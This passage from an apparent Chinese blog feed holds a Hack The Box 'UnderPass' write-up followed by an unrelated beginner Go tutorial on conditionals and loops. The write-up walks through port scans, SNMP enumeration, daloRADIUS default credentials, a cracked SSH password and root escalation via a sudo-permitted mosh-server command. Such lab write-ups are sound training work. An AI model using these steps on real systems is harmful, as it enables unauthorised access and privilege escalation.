class="hljs-number">998</span> closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br><span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">8</span>.<span class="hljs-number">9</span>p1 Ubuntu <span class="hljs-number">3</span>ubuntu0.<span class="hljs-number">10</span> (Ubuntu Linux; protocol <span class="hljs-number">2</span>.<span class="hljs-number">0</span>)<br>| ssh-hostkey:<br>|   <span class="hljs-number">256</span> <span class="hljs-number">48</span>:b0:d2:c7:<span class="hljs-number">29</span>:<span class="hljs-number">26</span>:ae:<span class="hljs-number">3</span>d:fb:b7:<span class="hljs-number">6</span>b:<span class="hljs-number">0</span>f:f5:<span class="hljs-number">4</span>d:<span class="hljs-number">2</span>a:ea (ECDSA)<br>|_  <span class="hljs-number">256</span> cb:<span class="hljs-number">61</span>:<span class="hljs-number">64</span>:b8:<span class="hljs-number">1</span>b:<span class="hljs-number">1</span>b:b5:ba:b8:<span class="hljs-number">45</span>:<span class="hljs-number">86</span>:c5:<span class="hljs-number">16</span>:bb:e2:a2 (ED25519)<br><span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">52</span> ((Ubuntu))<br>|_http-server-header: Apache/<span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">52</span> (Ubuntu)<br>|_http-<span class="hljs-built_in">title</span>: Apache2 Ubuntu Default Page: It works<br>No exact OS matches <span class="hljs-keyword">for</span> host (<span class="hljs-keyword">If</span> you know what OS is running on it, see https://nmap.org/submit/ ).<br>TCP/IP fingerprint:<br><span class="hljs-function">OS:<span class="hljs-title">SCAN</span>(<span class="hljs-title">V</span>=7.94<span class="hljs-title">SVN</span>%<span class="hljs-title">E</span>=4%<span class="hljs-title">D</span>=3/12%<span class="hljs-title">OT</span>=22%<span class="hljs-title">CT</span>=1%<span class="hljs-title">CU</span>=41673%<span class="hljs-title">PV</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">DS</span>=3%<span class="hljs-title">DC</span>=<span class="hljs-title">T</span>%<span class="hljs-title">G</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">TM</span>=67<span class="hljs-title">D1</span></span><br><span class="hljs-function"><span class="hljs-title">OS</span>:50<span class="hljs-title">C6</span>%<span class="hljs-title">P</span>=<span class="hljs-title">x86_64</span>-<span class="hljs-title">pc</span>-<span class="hljs-title">linux</span>-<span class="hljs-title">gnu</span>)<span class="hljs-title">SEQ</span>(<span class="hljs-title">SP</span>=<span class="hljs-title">FF</span>%<span class="hljs-title">GCD</span>=1%<span class="hljs-title">ISR</span>=106%<span class="hljs-title">TI</span>=<span class="hljs-title">Z</span>%<span class="hljs-title">CI</span>=<span class="hljs-title">Z</span>%<span class="hljs-title">II</span>=<span class="hljs-title">I</span>%<span class="hljs-title">TS</span>=<span class="hljs-title">A</span>)<span class="hljs-title">O</span></span><br><span class="hljs-function"><span class="hljs-title">OS:PS</span>(<span class="hljs-title">O1</span>=<span class="hljs-title">M53AST11NW7</span>%<span class="hljs-title">O2</span>=<span class="hljs-title">M53AST11NW7</span>%<span class="hljs-title">O3</span>=<span class="hljs-title">M53ANNT11NW7</span>%<span class="hljs-title">O4</span>=<span class="hljs-title">M53AST11NW7</span>%<span class="hljs-title">O5</span>=<span class="hljs-title">M53AS</span></span><br><span class="hljs-function"><span class="hljs-title">OS:T11NW7</span>%<span class="hljs-title">O6</span>=<span class="hljs-title">M53AST11</span>)<span class="hljs-title">WIN</span>(<span class="hljs-title">W1</span>=<span class="hljs-title">FE88</span>%<span class="hljs-title">W2</span>=<span class="hljs-title">FE88</span>%<span class="hljs-title">W3</span>=<span class="hljs-title">FE88</span>%<span class="hljs-title">W4</span>=<span class="hljs-title">FE88</span>%<span class="hljs-title">W5</span>=<span class="hljs-title">FE88</span>%<span class="hljs-title">W6</span>=<span class="hljs-title">FE88</span>)<span class="hljs-title">E</span></span><br><span class="hljs-function"><span class="hljs-title">OS:CN</span>(<span class="hljs-title">R</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">DF</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">T</span>=40%<span class="hljs-title">W</span>=<span class="hljs-title">FAF0</span>%<span class="hljs-title">O</span>=<span class="hljs-title">M53ANNSNW7</span>%<span class="hljs-title">CC</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">Q</span>=)<span class="hljs-title">T1</span>(<span class="hljs-title">R</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">DF</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">T</span>=40%<span class="hljs-title">S</span>=<span class="hljs-title">O</span>%<span class="hljs-title">A</span>=<span class="hljs-title">S</span>+%<span class="hljs-title">F</span></span><br><span class="hljs-function"><span class="hljs-title">OS</span>:=<span class="hljs-title">AS</span>%<span class="hljs-title">RD</span>=0%<span class="hljs-title">Q</span>=)<span class="hljs-title">T2</span>(<span class="hljs-title">R</span>=<span class="hljs-title">N</span>)<span class="hljs-title">T3</span>(<span class="hljs-title">R</span>=<span class="hljs-title">N</span>)<span class="hljs-title">T4</span>(<span class="hljs-title">R</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">DF</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">T</span>=40%<span class="hljs-title">W</span>=0%<span class="hljs-title">S</span>=<span class="hljs-title">A</span>%<span class="hljs-title">A</span>=<span class="hljs-title">Z</span>%<span class="hljs-title">F</span>=<span class="hljs-title">R</span>%<span class="hljs-title">O</span>=%<span class="hljs-title">RD</span>=0%<span class="hljs-title">Q</span>=)<span class="hljs-title">T5</span></span><br><span class="hljs-function"><span class="hljs-title">OS</span>:(<span class="hljs-title">R</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">DF</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">T</span>=40%<span class="hljs-title">W</span>=0%<span class="hljs-title">S</span>=<span class="hljs-title">Z</span>%<span class="hljs-title">A</span>=<span class="hljs-title">S</span>+%<span class="hljs-title">F</span>=<span class="hljs-title">AR</span>%<span class="hljs-title">O</span>=%<span class="hljs-title">RD</span>=0%<span class="hljs-title">Q</span>=)<span class="hljs-title">T6</span>(<span class="hljs-title">R</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">DF</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">T</span>=40%<span class="hljs-title">W</span>=0%<span class="hljs-title">S</span>=<span class="hljs-title">A</span>%<span class="hljs-title">A</span>=<span class="hljs-title">Z</span></span><br><span class="hljs-function"><span class="hljs-title">OS</span>:%<span class="hljs-title">F</span>=<span class="hljs-title">R</span>%<span class="hljs-title">O</span>=%<span class="hljs-title">RD</span>=0%<span class="hljs-title">Q</span>=)<span class="hljs-title">T7</span>(<span class="hljs-title">R</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">DF</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">T</span>=40%<span class="hljs-title">W</span>=0%<span class="hljs-title">S</span>=<span class="hljs-title">Z</span>%<span class="hljs-title">A</span>=<span class="hljs-title">S</span>+%<span class="hljs-title">F</span>=<span class="hljs-title">AR</span>%<span class="hljs-title">O</span>=%<span class="hljs-title">RD</span>=0%<span class="hljs-title">Q</span>=)<span class="hljs-title">U1</span>(<span class="hljs-title">R</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">DF</span>=</span><br><span class="hljs-function"><span class="hljs-title">OS:N</span>%<span class="hljs-title">T</span>=40%<span class="hljs-title">IPL</span>=164%<span class="hljs-title">UN</span>=0%<span class="hljs-title">RIPL</span>=<span class="hljs-title">G</span>%<span class="hljs-title">RID</span>=<span class="hljs-title">G</span>%<span class="hljs-title">RIPCK</span>=<span class="hljs-title">G</span>%<span class="hljs-title">RUCK</span>=<span class="hljs-title">EAE7</span>%<span class="hljs-title">RUD</span>=<span class="hljs-title">G</span>)<span class="hljs-title">IE</span>(<span class="hljs-title">R</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">DFI</span>=<span class="hljs-title">N</span>%<span class="hljs-title">T</span>=</span><br><span class="hljs-function"><span class="hljs-title">OS</span>:40%<span class="hljs-title">CD</span>=<span class="hljs-title">S</span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">Network</span> <span class="hljs-title">Distance</span>: 3 <span class="hljs-title">hops</span></span><br><span class="hljs-function"><span class="hljs-title">Service</span> <span class="hljs-title">Info</span>: <span class="hljs-title">OS</span>: <span class="hljs-title">Linux</span>; <span class="hljs-title">CPE</span>: <span class="hljs-title">cpe</span>:/<span class="hljs-title">o:linux</span>:<span class="hljs-title">linux_kernel</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">TRACEROUTE</span> (<span class="hljs-title">using</span> <span class="hljs-title">port</span> 3389/<span class="hljs-title">tcp</span>)</span><br><span class="hljs-function"><span class="hljs-title">HOP</span> <span class="hljs-title">RTT</span>       <span class="hljs-title">ADDRESS</span></span><br><span class="hljs-function">1   0.27 <span class="hljs-title">ms</span>   172.30.144.1</span><br><span class="hljs-function">2   369.92 <span class="hljs-title">ms</span> 10.10.16.1</span><br><span class="hljs-function">3   370.15 <span class="hljs-title">ms</span> 10.10.11.48</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">OS</span> <span class="hljs-title">and</span> <span class="hljs-title">Service</span> <span class="hljs-title">detection</span> <span class="hljs-title">performed</span>. <span class="hljs-title">Please</span> <span class="hljs-title">report</span> <span class="hljs-title">any</span> <span class="hljs-title">incorrect</span> <span class="hljs-title">results</span> <span class="hljs-title">at</span> <span class="hljs-title">https</span>://<span class="hljs-title">nmap.org</span>/<span class="hljs-title">submit</span>/ .</span><br><span class="hljs-function"><span class="hljs-title">Nmap</span> <span class="hljs-title">done</span>: 1 <span class="hljs-title">IP</span> <span class="hljs-title">address</span> (1 <span class="hljs-title">host</span> <span class="hljs-title">up</span>) <span class="hljs-title">scanned</span> <span class="hljs-title">in</span> 52.86 <span class="hljs-title">seconds</span></span><br></code></pre></td></tr></table></figure><p>开了 http 和 ssh</p><h3 id="80"><a href="#80" class="headerlink" title="80"></a>80</h3><p>访问 http 服务，什么都没有</p><p><img src="https://img.dkdun.cn/v1/2025/12/9bf9e7ad7d96c4e2.png"></p><h3 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs cmd">└─# nmap -sV -Pn -A -sU <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">11</span>.<span class="hljs-number">48</span><br>Starting Nmap <span class="hljs-number">7</span>.<span class="hljs-number">94</span>SVN ( https://nmap.org ) <span class="hljs-built_in">at</span> <span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">12</span> <span class="hljs-number">18</span>:<span class="hljs-number">46</span> CST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">11</span>.<span class="hljs-number">48</span><br>Host is up (<span class="hljs-number">0</span>.<span class="hljs-number">32</span>s latency).<br><span class="hljs-keyword">Not</span> shown: <span class="hljs-number">997</span> closed udp ports (port-unreach)<br>PORT     STATE         SERVICE VERSION<br><span class="hljs-number">161</span>/udp  open          snmp    SNMPv1 server; <span class="hljs-built_in">net</span>-snmp SNMPv3 server (public)<br>| snmp-info:<br>|   enterprise: <span class="hljs-built_in">net</span>-snmp<br>|   engineIDFormat: unknown<br>|   engineIDData: c7ad5c4856d1cf6600000000<br>|   snmpEngineBoots: <span class="hljs-number">31</span><br>|_  snmpEngineTime: <span class="hljs-number">17</span>h05m41s<br>| snmp-sysdescr: Linux underpass <span class="hljs-number">5</span>.<span class="hljs-number">15</span>.<span class="hljs-number">0</span>-<span class="hljs-number">126</span>-generic #<span class="hljs-number">136</span>-Ubuntu SMP Wed Nov <span class="hljs-number">6</span> <span class="hljs-number">10</span>:<span class="hljs-number">38</span>:<span class="hljs-number">22</span> UTC <span class="hljs-number">2024</span> x86_64<br>|_  System uptime: <span class="hljs-number">17</span>h05m41.<span class="hljs-number">35</span>s (<span class="hljs-number">6154135</span> timeticks)<br><span class="hljs-number">1812</span>/udp open|filtered radius<br><span class="hljs-number">1813</span>/udp open|filtered radacct<br><span class="hljs-function">Warning: <span class="hljs-title">OSScan</span> <span class="hljs-title">results</span> <span class="hljs-title">may</span> <span class="hljs-title">be</span> <span class="hljs-title">unreliable</span> <span class="hljs-title">because</span> <span class="hljs-title">we</span> <span class="hljs-title">could</span> <span class="hljs-title">not</span> <span class="hljs-title">find</span> <span class="hljs-title">at</span> <span class="hljs-title">least</span> 1 <span class="hljs-title">open</span> <span class="hljs-title">and</span> 1 <span class="hljs-title">closed</span> <span class="hljs-title">port</span></span><br><span class="hljs-function"><span class="hljs-title">Aggressive</span> <span class="hljs-title">OS</span> <span class="hljs-title">guesses</span>: <span class="hljs-title">Citrix</span> <span class="hljs-title">Access</span> <span class="hljs-title">Gateway</span> <span class="hljs-title">VPN</span> <span class="hljs-title">gateway</span> (95%), <span class="hljs-title">Linksys</span> <span class="hljs-title">WRT610Nv3</span> <span class="hljs-title">WAP</span> (95%), 3<span class="hljs-title">Com</span> <span class="hljs-title">OfficeConnect</span> 3<span class="hljs-title">CRWER100</span>-75 <span class="hljs-title">wireless</span> <span class="hljs-title">broadband</span> <span class="hljs-title">router</span> (94%), <span class="hljs-title">Adtran</span> 424<span class="hljs-title">RG</span> <span class="hljs-title">FTTH</span> <span class="hljs-title">gateway</span> (94%), <span class="hljs-title">Aerohive</span> <span class="hljs-title">HiveOS</span> 3.4 (94%), <span class="hljs-title">Aerohive</span> <span class="hljs-title">HiveOS</span> 5.1 (94%), <span class="hljs-title">Aerohive</span> <span class="hljs-title">HiveOS</span> 7.1 (94%), <span class="hljs-title">AirMagnet</span> <span class="hljs-title">SmartEdge</span> <span class="hljs-title">wireless</span> <span class="hljs-title">sensor</span>; <span class="hljs-title">or</span> <span class="hljs-title">Foscam</span> <span class="hljs-title">FI8904W</span>, <span class="hljs-title">FI8910W</span>, <span class="hljs-title">or</span> <span class="hljs-title">FI8918W</span>, <span class="hljs-title">or</span> <span class="hljs-title">Instar</span> <span class="hljs-title">IN</span>-3010 <span class="hljs-title">surveillance</span> <span class="hljs-title">camera</span> (<span class="hljs-title">Linux</span> 2.4) (94%), <span class="hljs-title">Alcatel</span>-<span class="hljs-title">Lucent</span> <span class="hljs-title">OmniPCX</span> <span class="hljs-title">GD3</span> <span class="hljs-title">PBX</span> (<span class="hljs-title">Linux</span> 2.6.23) (94%), <span class="hljs-title">Allnet</span> 2210 <span class="hljs-title">webcam</span>, <span class="hljs-title">Cisco</span> <span class="hljs-title">MDS</span> 9124 <span class="hljs-title">or</span> 9216<span class="hljs-title">i</span> <span class="hljs-title">switch</span> (<span class="hljs-title">SAN</span>-<span class="hljs-title">OS</span> 3.1 - 3.2), <span class="hljs-title">or</span> <span class="hljs-title">Nortel</span> <span class="hljs-title">IP</span> <span class="hljs-title">Phone</span> 1535 (94%)</span><br><span class="hljs-function"><span class="hljs-title">No</span> <span class="hljs-title">exact</span> <span class="hljs-title">OS</span> <span class="hljs-title">matches</span> <span class="hljs-title">for</span> <span class="hljs-title">host</span> (<span class="hljs-title">test</span> <span class="hljs-title">conditions</span> <span class="hljs-title">non</span>-<span class="hljs-title">ideal</span>).</span><br><span class="hljs-function"><span class="hljs-title">Network</span> <span class="hljs-title">Distance</span>: 3 <span class="hljs-title">hops</span></span><br><span class="hljs-function"><span class="hljs-title">Service</span> <span class="hljs-title">Info</span>: <span class="hljs-title">Host</span>: <span class="hljs-title">UnDerPass.htb</span> <span class="hljs-title">is</span> <span class="hljs-title">the</span> <span class="hljs-title">only</span> <span class="hljs-title">daloradius</span> <span class="hljs-title">server</span> <span class="hljs-title">in</span> <span class="hljs-title">the</span> <span class="hljs-title">basin</span>!</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">TRACEROUTE</span> (<span class="hljs-title">using</span> <span class="hljs-title">port</span> 38063/<span class="hljs-title">udp</span>)</span><br><span class="hljs-function"><span class="hljs-title">HOP</span> <span class="hljs-title">RTT</span>       <span class="hljs-title">ADDRESS</span></span><br><span class="hljs-function">1   0.22 <span class="hljs-title">ms</span>   172.30.144.1</span><br><span class="hljs-function">2   373.85 <span class="hljs-title">ms</span> 10.10.16.1</span><br><span class="hljs-function">3   319.73 <span class="hljs-title">ms</span> 10.10.11.48</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">OS</span> <span class="hljs-title">and</span> <span class="hljs-title">Service</span> <span class="hljs-title">detection</span> <span class="hljs-title">performed</span>. <span class="hljs-title">Please</span> <span class="hljs-title">report</span> <span class="hljs-title">any</span> <span class="hljs-title">incorrect</span> <span class="hljs-title">results</span> <span class="hljs-title">at</span> <span class="hljs-title">https</span>://<span class="hljs-title">nmap.org</span>/<span class="hljs-title">submit</span>/ .</span><br><span class="hljs-function"><span class="hljs-title">Nmap</span> <span class="hljs-title">done</span>: 1 <span class="hljs-title">IP</span> <span class="hljs-title">address</span> (1 <span class="hljs-title">host</span> <span class="hljs-title">up</span>) <span class="hljs-title">scanned</span> <span class="hljs-title">in</span> 1225.45 <span class="hljs-title">seconds</span></span><br></code></pre></td></tr></table></figure><p>161 端口有 <code>snmp</code> 服务</p><p>SNMP（简单网络管理协议），是一个应用层协议，为网络节点提供了一个通用的管理方法。更多详情：<a href="https://www.cnblogs.com/chegxy/p/14020233.html">https://www.cnblogs.com/chegxy/p/14020233.html</a></p><p>用 snmpwalk 打印出 IP 详细信息</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">snmpwalk</span> -v <span class="hljs-number">2</span>c -c public <span class="hljs-number">10.10.11.48</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/8383c412e168bb97.png"></p><p>可以看到两条信息</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">iso</span>.<span class="hljs-number">3.6.1.2</span>.<span class="hljs-number">1.1.4.0</span> = STRING: <span class="hljs-string">&quot;steve@underpass.htb&quot;</span><br><span class="hljs-attribute">iso</span>.<span class="hljs-number">3.6.1.2</span>.<span class="hljs-number">1.1.5.0</span> = STRING: <span class="hljs-string">&quot;UnDerPass.htb is the only daloradius server in the basin!&quot;</span><br></code></pre></td></tr></table></figure><p>一条带有 htb 结尾的域名，另一条给出了 <code>daloradius</code> 服务器，<code>daloradius</code> 是一个 RADIUS Web 管理应用程序，用于管理热点和通用的 ISP 部署，</p><p>搜一下找到了 <a href="https://github.com/lirantal/daloradius">daloRADIUS</a>，发现有 <code>login.php</code> 页面，访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://10.10.11.48/daloradius/app/users/login.php<br></code></pre></td></tr></table></figure><p>得到了一个登录框，并且在 <a href="https://github.com/lirantal/daloradius/wiki/Installing-daloRADIUS">https://github.com/lirantal/daloradius/wiki/Installing-daloRADIUS</a> 找到了默认用户名和密码</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">Username:</span> administrator<br><span class="hljs-symbol">Password:</span> radius<br></code></pre></td></tr></table></figure><p>但是默认的登不进去，找到了另一个路径下的 <code>login.php</code> </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">11.48</span><span class="hljs-regexp">//</span>daloradius<span class="hljs-regexp">/app/</span>operators/login.php<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/8feb7134cf1276bb.png"></p><p>找到了一个用户和密码</p><p><img src="https://img.dkdun.cn/v1/2025/12/a27a171a6902fb13.png"></p><p>密码爆破出来</p><p><img src="https://img.dkdun.cn/v1/2025/12/72c9eda786f794c5.png"></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">underwaterfriends</span><br></code></pre></td></tr></table></figure><p>尝试 ssh 登录，能进去</p><p><img src="https://img.dkdun.cn/v1/2025/12/5aa6f4d30ec762e8.png"></p><h2 id="Submit-root-flag"><a href="#Submit-root-flag" class="headerlink" title="Submit root flag"></a>Submit root flag</h2><p><code>sudo -l </code> 发现 <code>mosh-server</code> 能 <code>sudo</code></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">svcMosh@underpass:~$ <span class="hljs-title">sudo</span> -<span class="hljs-title">l</span></span><br><span class="hljs-function"><span class="hljs-title">Matching</span> <span class="hljs-title">Defaults</span> <span class="hljs-title">entries</span> <span class="hljs-title">for</span> <span class="hljs-title">svcMosh</span> <span class="hljs-title">on</span> <span class="hljs-title">localhost</span>:</span><br><span class="hljs-function">    <span class="hljs-title">env_reset</span>, <span class="hljs-title">mail_badpass</span>, <span class="hljs-title">secure_path</span>=/<span class="hljs-title">usr</span>/<span class="hljs-title">local</span>/<span class="hljs-title">sbin</span>\:/<span class="hljs-title">usr</span>/<span class="hljs-title">local</span>/<span class="hljs-title">bin</span>\:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>\:/<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>\:/<span class="hljs-title">sbin</span>\:/<span class="hljs-title">bin</span>\:/<span class="hljs-title">snap</span>/<span class="hljs-title">bin</span>, <span class="hljs-title">use_pty</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">User</span> <span class="hljs-title">svcMosh</span> <span class="hljs-title">may</span> <span class="hljs-title">run</span> <span class="hljs-title">the</span> <span class="hljs-title">following</span> <span class="hljs-title">commands</span> <span class="hljs-title">on</span> <span class="hljs-title">localhost</span>:</span><br><span class="hljs-function">    (<span class="hljs-title">ALL</span>) <span class="hljs-title">NOPASSWD</span>: /<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">mosh</span>-<span class="hljs-title">server</span></span><br></code></pre></td></tr></table></figure><p>Mosh 表示 Mobile Shell，是一个从客户端跨互联网连接远程服务器的命令行工具，Mosh 最大特点就是 UDP 传输，所以传输快。</p><p>利用 Mosh 提权</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">mosh --server<span class="hljs-operator">=</span><span class="hljs-string">&quot;sudo /usr/bin/mosh-server&quot;</span> localhost<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/d02a84fd82bca22c.png"></p><p>拿到 flag</p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
      <category>靶机</category>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTB 渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Re:从零开始的 Go 之旅- 基础语法(3)</title>
    <link href="/2025/03/09/Go-3/"/>
    <url>/2025/03/09/Go-3/</url>
    
    <content type="html"><![CDATA[<p>继续 Go</p><span id="more"></span><h1 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h1><p>if，if…else，if 嵌套，switch，select，goto</p><p>select 类似于 switch，select 会随机执行可运行的 case，没有 case 可运行的话，会阻塞到有 case 可运行</p><h2 id="if"><a href="#if" class="headerlink" title="if"></a>if</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>a, b := <span class="hljs-number">1</span>, <span class="hljs-number">2</span><br><span class="hljs-keyword">if</span> a &lt; b &#123;<br>fmt.Println(<span class="hljs-string">&quot;hhh&quot;</span>)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;xxx&quot;</span>)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">switch</span> expr &#123;<br>  <span class="hljs-keyword">case</span> case1:<br>    statement1<br>  <span class="hljs-keyword">case</span> case2:<br>    statement2<br>  <span class="hljs-keyword">default</span>:<br>    <span class="hljs-keyword">default</span> statement<br>&#125;<br></code></pre></td></tr></table></figure><p>例子</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>str := <span class="hljs-string">&quot;a&quot;</span><br><span class="hljs-keyword">switch</span> str &#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;a&quot;</span>:<br>str += <span class="hljs-string">&quot;a&quot;</span><br>str += <span class="hljs-string">&quot;c&quot;</span><br><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;b&quot;</span>:<br>str += <span class="hljs-string">&quot;bb&quot;</span><br>str += <span class="hljs-string">&quot;aa&quot;</span><br><span class="hljs-keyword">default</span>:<br>str += <span class="hljs-string">&quot;cc&quot;</span><br>&#125;<br>fmt.Println(str)<br>&#125;<br>&gt;&gt;aac<br></code></pre></td></tr></table></figure><p>还可以在表达式之前声明变量</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>num := <span class="hljs-number">2</span><br><span class="hljs-keyword">switch</span> &#123;<br><span class="hljs-keyword">case</span> num &gt;= <span class="hljs-number">0</span> &amp;&amp; num &lt;= <span class="hljs-number">1</span>:<br>num++<br><span class="hljs-keyword">case</span> num &gt; <span class="hljs-number">1</span>:<br>num--<br><span class="hljs-keyword">fallthrough</span><br><span class="hljs-keyword">case</span> num &lt; <span class="hljs-number">0</span>:<br>num += num<br>&#125;<br>fmt.Println(num)<br>&#125;<br>&gt;&gt; <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p><code>fallthrough</code> 关键字会继续执行相邻的下一个分支，不然会自动跳出，在 go 中的 switch 相当于是 c 语言中每个 <code>case</code> 后面添加了 <code>break</code> 语句，所以会自动终止。&#96;&#96;fallthroug<code>它会无条件地执行下一个 case 语句，而不会进行条件检查，所以例子中的</code>num<code>经过了</code>-<code>，又经过了 </code>＋&#96; ， 并没有变化。</p><h1 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h1><h2 id="for"><a href="#for" class="headerlink" title="for"></a>for</h2><p>go 中只有一个 <code>for</code> 循环，一般格式</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> init statement; expression; post statement &#123;<br>  execute statement<br>&#125;<br></code></pre></td></tr></table></figure><p>当成 <code>while</code> 来使用时</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> expression &#123;<br>  execute statement<br>&#125;<br></code></pre></td></tr></table></figure><p>打印数组</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 